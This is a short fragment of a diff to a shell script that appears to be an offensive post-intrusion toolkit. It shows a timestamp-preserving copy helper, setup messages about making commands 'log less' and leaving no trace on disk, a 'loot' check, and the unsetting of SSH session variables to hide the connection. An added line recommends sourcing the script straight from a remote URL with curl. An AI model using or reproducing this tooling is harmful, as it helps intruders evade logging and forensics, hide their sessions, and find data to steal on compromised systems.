 ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, ctime, mtime & atime
@@ -1410,9 +1730,15 @@ echo -e ">>> Tweaking environment variables to log less     ${CN}[${CDG}DONE${CN
 echo -e ">>> Creating aliases to make commands log less     ${CN}[${CDG}DONE${CN}]"
 echo -e ">>> ${CG}Setup complete. ${CF}No data was written to the filesystem${CN}"
 
+# Warning if thc.org is used
+[ -n "$_HSURLORIGIN" ] && HS_WARN "Better use: ' ${CDC}source <(curl -SsfL ${_HSURL})${CDM}'${CN}"
+
 ### Check for obvious loots
 lootlight
 
 # unset all functions that are no longer needed.
 unset -f hs_init hs_init_alias hs_init_dl hs_init_shell
-unset SSH_CONNECTION SSH_CLIENT
+unset SSH_CONNECTION SSH_CLIENT _HSURLORIGIN
+
+# Do exit with TRUE in case parent shell ues 'set -e':
+:
